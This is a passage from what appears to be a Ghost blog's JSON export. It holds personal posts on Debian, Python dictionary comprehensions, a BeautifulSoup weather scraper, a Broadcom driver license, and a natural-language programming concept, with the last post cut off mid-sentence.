concise.","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-11-14T02:42:51.000Z","created_by":"1","updated_at":"2017-12-03T15:57:09.000Z","updated_by":"1","published_at":"2017-11-14T02:42:51.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea056762333000133279c","uuid":"2e263ad4-1e1b-4682-8725-5ec46c42fbf0","title":"Debian \"Sloppy\" above all?","slug":"temp-slug-56","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nI, like many, many others, began my adventures in Linux on Canonical’s beautifully polished Ubuntu. However, I am a chronic user of far-too-outdated hardware, so I commonly ran into driver issues. At one point, I decided to try Debian, hoping it’s claims of “stability” would mean less glitches for my old hardware. My hopes were largely fulfilled in Debian Jessie. I installed it on the first machine with zero problems, and the only subsequent problems I’ve had were with\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>I, like many, many others, began my adventures in Linux on Canonical’s beautifully polished Ubuntu. However, I am a chronic user of far-too-outdated hardware, so I commonly ran into driver issues. At one point, I decided to try Debian, hoping it’s claims of “stability” would mean less glitches for my old hardware. My hopes were largely fulfilled in Debian Jessie. I installed it on the first machine with zero problems, and the only subsequent problems I’ve had were with</p>\n</div>","amp":"717","plaintext":"I, like many, many others, began my adventures in Linux on Canonical’s\nbeautifully polished Ubuntu. However, I am a chronic user of far-too-outdated\nhardware, so I commonly ran into driver issues. At one point, I decided to try\nDebian, hoping it’s claims of “stability” would mean less glitches for my old\nhardware. My hopes were largely fulfilled in Debian Jessie. I installed it on\nthe first machine with zero problems, and the only subsequent problems I’ve had\nwere with","feature_image":null,"featured":0,"page":0,"status":"draft","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-12-06T23:57:09.000Z","created_by":"1","updated_at":"2017-12-06T23:57:09.000Z","updated_by":"1","published_at":"2018-09-04T15:10:14.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea056762333000133279d","uuid":"cfa80e02-6bc0-422b-b09e-455f94151682","title":"Conciseness and/or verbocity","slug":"conciseness-and-or-verbocity","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nresult = {st : re.match(re.compile(\\\"regular expression\\\"), st) for st in (\\\"strings\\\", \\\"to\\\", \\\"search\\\", \\\"for\\\")}\\n\\npattern = re.compile(\\\"regular expression\\\") result = {} for string in (\\\"strings\\\", \\\"to\\\", \\\"search\\\", \\\"for\\\"): result[string] = re.match(pattern, string)\\n\\nThese two blocks of code function precisely the same. They both check a 4-tuple of strings to see if any of them match a particular [regular expression](https://en.wikipedia.org/wiki/Regular_expression) pattern. The difference is that the first uses a more concise syntax known as “dictionary comprehension”. [Comprehension](https://en.wikipedia.org/wiki/List_comprehension) is a feature of python and a few other languages, and there are similar features in some languages that don’t include it. It took me a few tries to understand how it works, but now that I do, I find myself using it more and more. This isn’t a tutorial on how to use the various kinds of iterable comprehensions, rather a post to simply say “if you don’t know how these work, you should learn: they’re incredibly useful”.\\n\\nNow, there is a tradeoff — readability. Anyone who doesn’t know how comprehension works will be utterly confused by what looks like a for loop that occurs all within a single line. However, depending on the application, this tradeoff may be appropriate.\\n\\nAllow me to provide another example that I recently wrote while working on a project. It occurs after loading an XML [nmap](https://en.wikipedia.org/wiki/Nmap) result into [BeautifulSoup](https://www.crummy.com/software/BeautifulSoup/bs4/doc/), a powerful markup parser, and creates a [tuple](https://docs.python.org/3.6/library/stdtypes.html#tuple) of [port](https://en.wikipedia.org/wiki/Port_(computer_networking)) numbers that are open.\\n\\ncont_open_ports = ( port for port in cont_nmap_results.find_all(\\\"ports\\\")```\\n        [\\\"port_id\\\"]\\n)\\n```\\n\\nfind_all(“ports”)[“port_id”] returns a [generator](https://docs.python.org/3.6/c-api/gen.html) object, which can be [iterated](https://en.wikipedia.org/wiki/Iteration) upon. A tuple is created of the length of the number of open ports, and filled in. The alternative to this is to create a list and then convert that list to a tuple, which would be *much* slower.\\n\\nports = [] for port in cont_nmap_results.find_all(\\\"ports\\\"): ports.append(port) ports = tuple(ports)\\n\\nBoth of these code blocks would return a tuple of open ports, like “(22, 25, 80, 443)”, but the latter takes longer to write and to perform.\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>result = {st : re.match(re.compile(&quot;regular expression&quot;), st) for st in (&quot;strings&quot;, &quot;to&quot;, &quot;search&quot;, &quot;for&quot;)}</p>\n<p>pattern = re.compile(&quot;regular expression&quot;) result = {} for string in (&quot;strings&quot;, &quot;to&quot;, &quot;search&quot;, &quot;for&quot;): result[string] = re.match(pattern, string)</p>\n<p>These two blocks of code function precisely the same. They both check a 4-tuple of strings to see if any of them match a particular <a href=\"https://en.wikipedia.org/wiki/Regular_expression\">regular expression</a> pattern. The difference is that the first uses a more concise syntax known as “dictionary comprehension”. <a href=\"https://en.wikipedia.org/wiki/List_comprehension\">Comprehension</a> is a feature of python and a few other languages, and there are similar features in some languages that don’t include it. It took me a few tries to understand how it works, but now that I do, I find myself using it more and more. This isn’t a tutorial on how to use the various kinds of iterable comprehensions, rather a post to simply say “if you don’t know how these work, you should learn: they’re incredibly useful”.</p>\n<p>Now, there is a tradeoff — readability. Anyone who doesn’t know how comprehension works will be utterly confused by what looks like a for loop that occurs all within a single line. However, depending on the application, this tradeoff may be appropriate.</p>\n<p>Allow me to provide another example that I recently wrote while working on a project. It occurs after loading an XML <a href=\"https://en.wikipedia.org/wiki/Nmap\">nmap</a> result into <a href=\"https://www.crummy.com/software/BeautifulSoup/bs4/doc/\">BeautifulSoup</a>, a powerful markup parser, and creates a <a href=\"https://docs.python.org/3.6/library/stdtypes.html#tuple\">tuple</a> of <a href=\"https://en.wikipedia.org/wiki/Port_(computer_networking)\">port</a> numbers that are open.</p>\n<p>cont_open_ports = ( port for port in cont_nmap_results.find_all(&quot;ports&quot;)```<br>\n[&quot;port_id&quot;]<br>\n)</p>\n<pre><code>\nfind_all(“ports”)[“port_id”] returns a [generator](https://docs.python.org/3.6/c-api/gen.html) object, which can be [iterated](https://en.wikipedia.org/wiki/Iteration) upon. A tuple is created of the length of the number of open ports, and filled in. The alternative to this is to create a list and then convert that list to a tuple, which would be *much* slower.\n\nports = [] for port in cont_nmap_results.find_all(&quot;ports&quot;): ports.append(port) ports = tuple(ports)\n\nBoth of these code blocks would return a tuple of open ports, like “(22, 25, 80, 443)”, but the latter takes longer to write and to perform.\n\n\n</code></pre>\n</div>","amp":"720","plaintext":"result = {st : re.match(re.compile(\"regular expression\"), st) for st in\n(\"strings\", \"to\", \"search\", \"for\")}\n\npattern = re.compile(\"regular expression\") result = {} for string in (\"strings\",\n\"to\", \"search\", \"for\"): result[string] = re.match(pattern, string)\n\nThese two blocks of code function precisely the same. They both check a 4-tuple\nof strings to see if any of them match a particular regular expression\n[https://en.wikipedia.org/wiki/Regular_expression]  pattern. The difference is\nthat the first uses a more concise syntax known as “dictionary comprehension”. \nComprehension [https://en.wikipedia.org/wiki/List_comprehension]  is a feature\nof python and a few other languages, and there are similar features in some\nlanguages that don’t include it. It took me a few tries to understand how it\nworks, but now that I do, I find myself using it more and more. This isn’t a\ntutorial on how to use the various kinds of iterable comprehensions, rather a\npost to simply say “if you don’t know how these work, you should learn: they’re\nincredibly useful”.\n\nNow, there is a tradeoff — readability. Anyone who doesn’t know how\ncomprehension works will be utterly confused by what looks like a for loop that\noccurs all within a single line. However, depending on the application, this\ntradeoff may be appropriate.\n\nAllow me to provide another example that I recently wrote while working on a\nproject. It occurs after loading an XML nmap\n[https://en.wikipedia.org/wiki/Nmap]  result into BeautifulSoup\n[https://www.crummy.com/software/BeautifulSoup/bs4/doc/], a powerful markup\nparser, and creates a tuple  of port\n[https://en.wikipedia.org/wiki/Port_(computer_networking)]  numbers that are\nopen.\n\ncont_open_ports = ( port for port in cont_nmap_results.find_all(\"ports\")```\n[\"port_id\"]\n)\n\n\nfind_all(“ports”)[“port_id”] returns a [generator](https://docs.python.org/3.6/c-api/gen.html) object, which can be [iterated](https://en.wikipedia.org/wiki/Iteration) upon. A tuple is created of the length of the number of open ports, and filled in. The alternative to this is to create a list and then convert that list to a tuple, which would be *much* slower.\n\nports = [] for port in cont_nmap_results.find_all(\"ports\"): ports.append(port) ports = tuple(ports)\n\nBoth of these code blocks would return a tuple of open ports, like “(22, 25, 80, 443)”, but the latter takes longer to write and to perform.","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-12-27T03:28:17.000Z","created_by":"1","updated_at":"2017-12-27T03:28:17.000Z","updated_by":"1","published_at":"2017-12-27T03:28:17.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea056762333000133279e","uuid":"9b6bccff-9cf4-4bfd-af14-47704ab60db6","title":"Beautiful Soup","slug":"beautiful-soup","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nBeautiful Soup is a library for python for parsing and extracting data from HTML-like files (it also works on XML). I made this quick script to get the weather from NWS.\\n\\n```\\n#!/usr/bin/env python3.6<br></br>\\nimport requests<br></br>\\nfrom bs4 import BeautifulSoup as bs```\\n\\n```\\npage_url = \\\"http://forecast.weather.gov/obslocal.php?warnzone=PAZ021\\\"<br></br>\\nresponse = requests.get(page_url)```\\n\\n```\\nif response.status_code == 200:<br></br>\\nsoup = bs(response.text, \\\"html.parser\\\")```\\n\\n```\\ntabletxt = soup.find_all(name=\\\"tr\\\", attrs={'bgcolor': \\\"#eeeeee\\\"}) \\\\<br></br>\\n+ soup.find_all(name=\\\"tr\\\", attrs={'bgcolor': \\\"#f5f5f5\\\"})```\\n\\n```\\ntable = []<br></br>\\nfor row in tabletxt:<br></br>\\ntable.append(row.find_all(name='td'))```\\n\\n`print(table[0][2].text, \\\": \\\", table[0][3].text, \\\"°\\\", sep=\\\"\\\")`\\n\\nThis, internally, yields a two-dimensional list which mirrors the table on the [NWS site](http://forecast.weather.gov/obslocal.php?warnzone=PAZ021). I want to get the current conditions and temperature, so I printed out the third  and fourth columns of the first row, separating them with a colon. This will fit perfectly in my [i3bar/conky](https://i3wm.org/docs/user-contributed/conky-i3bar.html) config.\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>Beautiful Soup is a library for python for parsing and extracting data from HTML-like files (it also works on XML). I made this quick script to get the weather from NWS.</p>\n<pre><code>#!/usr/bin/env python3.6&lt;br&gt;&lt;/br&gt;\nimport requests&lt;br&gt;&lt;/br&gt;\nfrom bs4 import BeautifulSoup as bs```\n\n</code></pre>\n<p>page_url = &quot;<a href=\"http://forecast.weather.gov/obslocal.php?warnzone=PAZ021\">http://forecast.weather.gov/obslocal.php?warnzone=PAZ021</a>&quot;<br></br><br>\nresponse = requests.get(page_url)```</p>\n<pre><code>if response.status_code == 200:&lt;br&gt;&lt;/br&gt;\nsoup = bs(response.text, &quot;html.parser&quot;)```\n\n</code></pre>\n<p>tabletxt = soup.find_all(name=&quot;tr&quot;, attrs={'bgcolor': &quot;#eeeeee&quot;}) &lt;br&gt;</br></p>\n<ul>\n<li>soup.find_all(name=&quot;tr&quot;, attrs={'bgcolor': &quot;#f5f5f5&quot;})```</li>\n</ul>\n<pre><code>table = []&lt;br&gt;&lt;/br&gt;\nfor row in tabletxt:&lt;br&gt;&lt;/br&gt;\ntable.append(row.find_all(name='td'))```\n\n`print(table[0][2].text, &quot;: &quot;, table[0][3].text, &quot;°&quot;, sep=&quot;&quot;)`\n\nThis, internally, yields a two-dimensional list which mirrors the table on the [NWS site](http://forecast.weather.gov/obslocal.php?warnzone=PAZ021). I want to get the current conditions and temperature, so I printed out the third  and fourth columns of the first row, separating them with a colon. This will fit perfectly in my [i3bar/conky](https://i3wm.org/docs/user-contributed/conky-i3bar.html) config.\n\n\n</code></pre>\n</div>","amp":"726","plaintext":"Beautiful Soup is a library for python for parsing and extracting data from\nHTML-like files (it also works on XML). I made this quick script to get the\nweather from NWS.\n\n#!/usr/bin/env python3.6<br></br>\nimport requests<br></br>\nfrom bs4 import BeautifulSoup as bs```\n\n\n\npage_url = \"http://forecast.weather.gov/obslocal.php?warnzone=PAZ021\"\n\n\nresponse = requests.get(page_url)```\n\nif response.status_code == 200:<br></br>\nsoup = bs(response.text, \"html.parser\")```\n\n\n\ntabletxt = soup.find_all(name=\"tr\", attrs={'bgcolor': \"#eeeeee\"}) <br>\n\n\n * soup.find_all(name=\"tr\", attrs={'bgcolor': \"#f5f5f5\"})```\n\ntable = []<br></br>\nfor row in tabletxt:<br></br>\ntable.append(row.find_all(name='td'))```\n\n`print(table[0][2].text, \": \", table[0][3].text, \"°\", sep=\"\")`\n\nThis, internally, yields a two-dimensional list which mirrors the table on the [NWS site](http://forecast.weather.gov/obslocal.php?warnzone=PAZ021). I want to get the current conditions and temperature, so I printed out the third  and fourth columns of the first row, separating them with a colon. This will fit perfectly in my [i3bar/conky](https://i3wm.org/docs/user-contributed/conky-i3bar.html) config.","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-12-30T06:40:02.000Z","created_by":"1","updated_at":"2017-12-30T07:09:03.000Z","updated_by":"1","published_at":"2017-12-30T06:40:02.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea056762333000133279f","uuid":"482906fe-4338-4e1c-a62d-df49995755bb","title":"The Worst License Agreement I've Ever Seen, and In the Worst Place...","slug":"the-worst-license-agreement-ive-ever-seen-and-in-the-worst-place","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nSo I’ve been toying with the idea of using old android devices (I think I’ve got at least 3 or 4 laying around in various stages of disassembly) for things other than running Android, as a phone. So I started looking into the concept and was surprised by the lack of relevant search results. Naturally, that doesn’t deter me.\\n\\nI saw a blog post referencing a particular hardware configuration (that I don’t have). The [instructions were complicated](https://www.cnx-software.com/2015/12/06/how-to-run-headless-linux-on-amlogic-s905-devices-such-as-mini-mx-or-k1-plus/), but easy to follow. They specifically referenced that the drivers for the hardware he was working with had been made open. I don’t need open-source drivers *necessarily*, although of course I would prefer it. It’s not like I’d be able to make heads or tails of what I was looking at if I did decide to read the source anyway, so it’s really just about that added comfort of knowing that people who do know what they’re reading can look through it and check for nasty stuff.\\n\\nOr so I thought.\\n\\nIt turns out there’s another reason why proprietary drivers can be a problem. Allow me to quote from the [driver](https://developers.google.com/android/drivers#shamungi77b) agreement for the Broadcom wireless chip in my Nexus 6.\\n\\n- > Subject to the terms of this Agreement, Licensor hereby grants to You…[a] limited license… to download, install and use the Software internally in machine-readable (i.e., object code) form…for non-commercial use on an Authorized Android Enabled Device and non-commercial redistribution of the Authorized Android Enabled Device Software (the “Limited Purpose”).\\n- > The entire right, title and interest in the Software shall remain with Licensor and, unless specified in writing hereunder, no rights are granted to any of the Software.\\n- > No Commercialization or Distribution of the Software and Documentation. Except as expressly provided in Section 2 of this Agreement, You shall have no right to…(iii) use the Software and Documentation except for the Limited Purpose\\n\\nAnd this is in my phone!\\n\\nI have never seen such a heinous abuse of TOS agreements, although perhaps I’ve just had my nose stuck in GPL-land for too long.\\n\\nSo not only am I only allowed to run Android on the device, only allowed to run software in Android applications, but I’m also not allowed to do so for commercial purposes? Holy shit. Oh yeah, and I forgot this little gem, tucked between the “No Warrany” and “miscellaneous” sections.\\n\\n- > Additionally, Licensor may at any time terminate this Agreement, without cause, upon notice to You. Upon termination You must delete or destroy all copies of the Software in Your possession, and the license granted to You in this Agreement shall terminate.\\n\\nSo at any point Broadcom (or Motorola, or Qualcomm — and that’s just for my Nexus 6) can just come to you and say “oh, yeah, these devices you have here, we’re gonna have to ask you to brick them.”\\n\\nLovely. Just lovely.\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>So I’ve been toying with the idea of using old android devices (I think I’ve got at least 3 or 4 laying around in various stages of disassembly) for things other than running Android, as a phone. So I started looking into the concept and was surprised by the lack of relevant search results. Naturally, that doesn’t deter me.</p>\n<p>I saw a blog post referencing a particular hardware configuration (that I don’t have). The <a href=\"https://www.cnx-software.com/2015/12/06/how-to-run-headless-linux-on-amlogic-s905-devices-such-as-mini-mx-or-k1-plus/\">instructions were complicated</a>, but easy to follow. They specifically referenced that the drivers for the hardware he was working with had been made open. I don’t need open-source drivers <em>necessarily</em>, although of course I would prefer it. It’s not like I’d be able to make heads or tails of what I was looking at if I did decide to read the source anyway, so it’s really just about that added comfort of knowing that people who do know what they’re reading can look through it and check for nasty stuff.</p>\n<p>Or so I thought.</p>\n<p>It turns out there’s another reason why proprietary drivers can be a problem. Allow me to quote from the <a href=\"https://developers.google.com/android/drivers#shamungi77b\">driver</a> agreement for the Broadcom wireless chip in my Nexus 6.</p>\n<ul>\n<li>\n<blockquote>\n<p>Subject to the terms of this Agreement, Licensor hereby grants to You…[a] limited license… to download, install and use the Software internally in machine-readable (i.e., object code) form…for non-commercial use on an Authorized Android Enabled Device and non-commercial redistribution of the Authorized Android Enabled Device Software (the “Limited Purpose”).</p>\n</blockquote>\n</li>\n<li>\n<blockquote>\n<p>The entire right, title and interest in the Software shall remain with Licensor and, unless specified in writing hereunder, no rights are granted to any of the Software.</p>\n</blockquote>\n</li>\n<li>\n<blockquote>\n<p>No Commercialization or Distribution of the Software and Documentation. Except as expressly provided in Section 2 of this Agreement, You shall have no right to…(iii) use the Software and Documentation except for the Limited Purpose</p>\n</blockquote>\n</li>\n</ul>\n<p>And this is in my phone!</p>\n<p>I have never seen such a heinous abuse of TOS agreements, although perhaps I’ve just had my nose stuck in GPL-land for too long.</p>\n<p>So not only am I only allowed to run Android on the device, only allowed to run software in Android applications, but I’m also not allowed to do so for commercial purposes? Holy shit. Oh yeah, and I forgot this little gem, tucked between the “No Warrany” and “miscellaneous” sections.</p>\n<ul>\n<li>\n<blockquote>\n<p>Additionally, Licensor may at any time terminate this Agreement, without cause, upon notice to You. Upon termination You must delete or destroy all copies of the Software in Your possession, and the license granted to You in this Agreement shall terminate.</p>\n</blockquote>\n</li>\n</ul>\n<p>So at any point Broadcom (or Motorola, or Qualcomm — and that’s just for my Nexus 6) can just come to you and say “oh, yeah, these devices you have here, we’re gonna have to ask you to brick them.”</p>\n<p>Lovely. Just lovely.</p>\n</div>","amp":"733","plaintext":"So I’ve been toying with the idea of using old android devices (I think I’ve got\nat least 3 or 4 laying around in various stages of disassembly) for things other\nthan running Android, as a phone. So I started looking into the concept and was\nsurprised by the lack of relevant search results. Naturally, that doesn’t deter\nme.\n\nI saw a blog post referencing a particular hardware configuration (that I don’t\nhave). The instructions were complicated\n[https://www.cnx-software.com/2015/12/06/how-to-run-headless-linux-on-amlogic-s905-devices-such-as-mini-mx-or-k1-plus/]\n, but easy to follow. They specifically referenced that the drivers for the\nhardware he was working with had been made open. I don’t need open-source\ndrivers necessarily, although of course I would prefer it. It’s not like I’d be\nable to make heads or tails of what I was looking at if I did decide to read the\nsource anyway, so it’s really just about that added comfort of knowing that\npeople who do know what they’re reading can look through it and check for nasty\nstuff.\n\nOr so I thought.\n\nIt turns out there’s another reason why proprietary drivers can be a problem.\nAllow me to quote from the driver  agreement for the Broadcom wireless chip in\nmy Nexus 6.\n\n * Subject to the terms of this Agreement, Licensor hereby grants to You…[a]\n   limited license… to download, install and use the Software internally in\n   machine-readable (i.e., object code) form…for non-commercial use on an\n   Authorized Android Enabled Device and non-commercial redistribution of the\n   Authorized Android Enabled Device Software (the “Limited Purpose”).\n   \n   \n * The entire right, title and interest in the Software shall remain with\n   Licensor and, unless specified in writing hereunder, no rights are granted to\n   any of the Software.\n   \n   \n * No Commercialization or Distribution of the Software and Documentation.\n   Except as expressly provided in Section 2 of this Agreement, You shall have\n   no right to…(iii) use the Software and Documentation except for the Limited\n   Purpose\n   \n   \n\nAnd this is in my phone!\n\nI have never seen such a heinous abuse of TOS agreements, although perhaps I’ve\njust had my nose stuck in GPL-land for too long.\n\nSo not only am I only allowed to run Android on the device, only allowed to run\nsoftware in Android applications, but I’m also not allowed to do so for\ncommercial purposes? Holy shit. Oh yeah, and I forgot this little gem, tucked\nbetween the “No Warrany” and “miscellaneous” sections.\n\n * Additionally, Licensor may at any time terminate this Agreement, without\n   cause, upon notice to You. Upon termination You must delete or destroy all\n   copies of the Software in Your possession, and the license granted to You in\n   this Agreement shall terminate.\n   \n   \n\nSo at any point Broadcom (or Motorola, or Qualcomm — and that’s just for my\nNexus 6) can just come to you and say “oh, yeah, these devices you have here,\nwe’re gonna have to ask you to brick them.”\n\nLovely. Just lovely.","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2018-01-12T21:51:32.000Z","created_by":"1","updated_at":"2018-01-12T21:51:32.000Z","updated_by":"1","published_at":"2018-01-12T21:51:32.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea05676233300013327a0","uuid":"a67ae253-c929-4ec5-8592-ff4bb86face9","title":"Natural Language Programming...","slug":"natural-language-programming","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\n…is the concept of giving instructions to a computer in your natural language, like English, and the computer understanding that as code. To many people, this seems like a far-fetched concept, but the fact of the matter is that it’s quite feasible to do. The problem is that it’s not really a whole lot more clear than a defined syntax, and it’s perhaps harder to read. Even worse, it’s exceedingly verbose. A single symbol or a pair of symbols can represent a whole word or phrase, leading to more concise code that is more readable and quicker to write.\\n\\nSo then why the hell would anyone want to use a natural language like English to write code?\\n\\nMost people think of it as a teaching tool, along the lines of psuedocode. And it’s true — it seems to me it would be much easier to teach someone programming concepts in a syntactical structure they’re already familiar with, rather than having to teach them a syntax they may find confusing while you’re also trying to explain abstract concepts like classes, functions, and loops.\\n\\nHowever, that’s not why I want it. When I was a kid, we didn’t have cable, so before we had broadband, if I was sitting at home on a cold afternoon, the only thing to do was to binge Star Trek: TNG on one of those channels whose name changes all the time. I have long since been inspired by a lot of the fictional creations in the show, as many other nerds have been, including how they “wrote” holodeck “programs”. Holodeck programs were basically video games, but instead of sitting at a computer terminal poring over millions of lines of detailed code, the characters would simply shout to the disembodied computer “put me in a Shakespeare so I can show off how great of a Shakespearian actor I am in this totally unrelated show”.\\n\\nAnd the computer would respond with a realistic depiction of a Shakespearian narrative.\\n\\nNow, that’s not exactly what I think coding by voice would be like today. In fact, I think it would be just as tedious as striking the keys. However, allowing some of your code to be done by voice and some by text allows you to reduce the risk of repeated strain injury, something most programmers, including myself, suffer from.\\n\\nDefining a formal way of uttering computer code with voice would aid in creation of software to do so, and serve as a single meta-language with minor variations to allow coding in more than one language with the same syntax. It could also reduce the learning curve of people who already know to code, and serve as an educational tool.\\n\\nA first draft example of my concept follows:\\n\\n*Define a class named QueryIterator that is a plain object. This class will store an iterator for a database table which may have expanded. From the interface package, import app.*\\n\\n*Define the constructor for QueryIterator, with the parameter model. First, set the model of this to model. Then, call set_entries of this, with the argument, the result of the list, created by iterating entry for each entry in the result of calling the function all of query of model. That defines the constructor for QueryIterator. *\\n\\n*Define the function set_entries, an attribute of a QueryIterator, with the parameter entries, which is a list. Set LIST_OF_ENTRIES of this to entries, and count of this to the length of entries. That defines set_entries.*\\n\\nEquivalent python:\\n\\nclass QueryIterator(): \\\"\\\"\\\"An iterator for a database table which may have expanded.\\\"\\\"\\\" from interface import app COUNT = 0 LIST_OF_ENTRIES = [] def __init__(self, model): self.model = model self.set_entries([ entry for entry in model.query.all() ]) def set_entries(self, entries: list): self.LIST_OF_ENTRIES, self.COUNT = entries, len(entries)\\n\\nAnother example:\\n\\n*Define a function named check_image_type, with a parameter named image. This function will check what kind of file an image is. First, from the imghdr repo, import the what function (the what function expects a filename, but you can give it raw bytes with the h parameter; it then ignores the filename). Finally, return the result of what, with arguments “bullshit” and image as h. That defines check_image_type.*\\n\\nIn this example,\\n\\n- All statements (like “lines” of code) are completed with a period, followed by whitespace and a capitalized instruction indicating the start of a new statement.\\n- def = “Define a function”\\n- name of function = string between “named” and “,”\\n- attribute definition = assign text between “Name” and “,” to the name defined after the “,”; “of …” means it’s an attribute of another object. At first I considered using the english apostrophe-s notation, but then realized that the majority of other languages don’t include such a construct and including it would make translation difficult.\\n- Docstring = text after “This function will”\\n- Comments inside parentheses. Or perhaps starting with a certain word, or any word that isn’t a keyword.\\n- The last statement of the paragraph (like a block of code, in this case a function definition) can begin with “Finally, ” to indicate it is such. If (regex)”<var>Finally,\\\\s+</var>” is included, you don’t need to conclude the definition with the “That defines” statement. This allows for mid-statement line-breaks to avoid long functions looking like a “wall of text”.\\n\\nThe equivalent python to the above code is:\\n\\ndef check_image_type(image): \\\"\\\"\\\"Check what kind of file an image is\\\"\\\"\\\" from imghdr import what # what() expects a filename, but you can give it raw bytes with the h return what(\\\"bullshit\\\", h=image) # param. It then ignores the filename.\\n\\n \\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>…is the concept of giving instructions to a computer in your natural language, like English, and the computer understanding that as code. To many people, this seems like a far-fetched concept, but the fact of the matter is that it’s quite feasible to do. The problem is that it’s not really a whole lot more clear than a defined syntax, and it’s perhaps harder to read. Even worse, it’s exceedingly verbose. A single symbol or a pair of symbols can represent a whole word or phrase, leading to more concise code that is more readable and quicker to write.</p>\n<p>So then why the hell would anyone want to use a natural language like English to write code?</p>\n<p>Most people think of it as a teaching tool, along the lines of psuedocode. And it’s true — it seems to me it would be much easier to teach someone programming concepts in a syntactical structure they’re already familiar with, rather than having to teach them a syntax they may find confusing while you’re also trying to explain abstract concepts like classes, functions, and loops.</p>\n<p>However, that’s not why I want it. When I was a kid, we didn’t have cable, so before we had broadband, if I was sitting at home on a cold afternoon, the only thing to do was to binge Star Trek: TNG on one of those channels whose name changes all the time. I have long since been inspired by a lot of the fictional creations in the show, as many other nerds have been, including how they “wrote” holodeck “programs”. Holodeck programs were basically video games, but instead of sitting at a computer terminal poring over millions of lines of detailed code, the characters would simply shout to the disembodied computer “put me in a Shakespeare so I can show off how great of a Shakespearian actor I am in this totally unrelated show”.</p>\n<p>And the computer would respond with a realistic depiction of a Shakespearian narrative.</p>\n<p>Now, that’s not exactly what I think coding by voice would be like today. In fact, I think it would be just as tedious as striking the keys. However, allowing some of your code to be done by voice and some by text allows you to reduce the risk of repeated strain injury, something most programmers, including myself, suffer from.</p>\n<p>Defining a formal way of uttering computer code with voice would aid in creation of software to do so, and serve as a single meta-language with minor variations to allow coding in more than one language with the same syntax. It could also reduce the learning curve of people who already know to code, and serve as an educational tool.</p>\n<p>A first draft example of my concept follows:</p>\n<p><em>Define a class named QueryIterator that is a plain object. This class will store an iterator for a database table which may have expanded. From the interface package, import app.</em></p>\n<p>*Define the constructor for QueryIterator, with the parameter model. First, set the model of this to model. Then, call set_entries of this, with the argument, the result of the list, created by iterating entry for each entry in the result of calling the function all of query of model. That defines the constructor for QueryIterator. *</p>\n<p><em>Define the function set_entries, an attribute of a QueryIterator, with the parameter entries, which is a list. Set LIST_OF_ENTRIES of this to entries, and count of this to the length of entries. That defines set_entries.</em></p>\n<p>Equivalent python:</p>\n<p>class QueryIterator(): &quot;&quot;&quot;An iterator for a database table which may have expanded.&quot;&quot;&quot; from interface import app COUNT = 0 LIST_OF_ENTRIES = [] def <strong>init</strong>(self, model): self.model = model self.set_entries([ entry for entry in model.query.all() ]) def set_entries(self, entries: list): self.LIST_OF_ENTRIES, self.COUNT = entries, len(entries)</p>\n<p>Another example:</p>\n<p><em>Define a function named check_image_type, with a parameter named image. This function will check what kind of file an image is. First, from the imghdr repo, import the what function (the what function expects a filename, but you can give it raw bytes with the h parameter; it then ignores the filename). Finally, return the result of what, with arguments “bullshit” and image as h. That defines check_image_type.</em></p>\n<p>In this example,</p>\n<ul>\n<li>All statements (like “lines” of code) are completed with a period, followed by whitespace and a capitalized instruction indicating the start of a new statement.</li>\n<li>def = “Define a function”</li>\n<li>name of function = string between “named” and “,”</li>\n<li>attribute definition = assign text between “Name” and “,” to the name defined after the “,”; “of …” means it’s an attribute of another object. At first I considered using the english apostrophe-s notation, but then realized that the majority of other languages don’t include such a construct and including it would make translation difficult.</li>\n<li>Docstring = text after “This function will”</li>\n<li>Comments inside parentheses. Or perhaps starting with a certain word, or any word that isn’t a keyword.</li>\n<li>The last statement of the paragraph (like a block of code, in this case a function definition) can begin with “Finally, ” to indicate it is such. If 